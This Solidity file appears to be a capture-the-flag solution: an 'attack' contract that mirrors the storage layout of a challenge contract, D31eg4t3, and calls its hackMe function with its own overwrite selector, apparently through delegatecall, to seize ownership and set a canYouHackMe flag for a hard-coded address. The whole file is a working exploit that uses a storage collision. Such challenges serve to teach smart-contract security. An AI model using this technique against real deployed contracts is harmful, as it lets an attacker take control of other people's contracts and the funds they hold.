// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "./Chal.sol";

contract attack {
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    D31eg4t3 target_contract;

    constructor(address target_addr)
    {
        target_contract = D31eg4t3(target_addr);
    }

    function attack_fun() public 
    {
        target_contract.hackMe(abi.encodeWithSelector(this.overwrite.selector));
    }

    function overwrite() public
    {
        owner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        canYouHackMe[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4] = true;
    }
}